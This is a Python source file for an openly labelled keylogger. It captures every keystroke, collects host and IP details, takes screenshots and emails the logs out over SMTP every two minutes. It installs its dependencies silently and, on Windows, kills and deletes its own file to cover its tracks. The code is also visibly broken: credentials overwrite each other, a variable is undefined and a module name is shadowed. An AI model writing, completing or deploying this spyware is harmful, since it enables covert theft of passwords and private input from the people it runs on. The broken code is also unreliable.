try:
    import os
    import platform
    import smtplib
    import socket
    import threading
    import pyscreenshot
    from pynput import keyboard
    from pynput.keyboard import Listener
    from email import encoders
    from email.mime.base import MIMEBase
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText
except ModuleNotFoundError:
    from subprocess import call
    modules = ["pyscreenshot","pynput"]
    call("pip install " + ' '.join(modules), shell=True)


finally:
    EMAIL = "YOUR_USERNAME"
    EMAIL = "YOUR_PASSWORD"
    SEND_REPORT_EVERY = 120 # as in seconds
    
    class KeyLogger:
        def __init__(self, time, email, password):
            self.time = time
            self.log = "KeyLogger Started..."
            self.email = email
            self.password = password

        def appendlog(self, string):
            self.log = self.log + string

        def save_data(self, key):
            try:
                current_key = str(key.char)
            except AttributeError:
                if key == key.space:
                    current_key = "SPACE"
                elif key == key.esc:
                    current_key = "ESC"
                else:
                    current_key = " " + str(key) + " "

            self.appendlog(current_key)

        def send_mail(self, email, password, message):
            sender = "Private Person <from@email.com>"
            receiver = "A Test User <to@email.com>"

            m = f"""\
            Subject: Kylogger mail  is for u $ir
            To: {receiver}
            From: {sender}

            Keylogger MAil\n"""

            m += message
            with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
                server.login(email, password)
                server.sendmail(sender, receiver, message)

        def report(self):
            self.send_mail(self.email, self.password, "\n\n" + self.log)
            self.log = ""
            timer = threading.Timer(self.time, self.report)
            timer.start()

        def system_information(self):
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            plat = platform.processor()
            system = platform.system()
            machine = platform.machine()
            self.appendlog(hostname)
            self.appendlog(ip)
            self.appendlog(plat)
            self.appendlog(system)
            self.appendlog(machine)
 

            self.send_mail(email=EMAIL, password=EMAIL, message=obj)

        def screenshot(self):
            img = pyscreenshot.grab()
            self.send_mail(email=EMAIL, password=EMAIL, message=img)

        def run(self):
            keyboard = keyboard.Listener(on_press=self.save_data)
            with keyboard:
                self.report()
                keyboard.join()

            if os.name == "nt":
                try:
                    pwd = os.path.abspath(os.getcwd())
                    os.system("cd " + pwd)
                    os.system("TASKKILL /F /IM " + os.path.basename(__file__))
                    print('File was closed.')
                    os.system("DEL " + os.path.basename(__file__))
                except OSError:
                    print('File is close.')

    keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL, EMAIL)
    keylogger.run()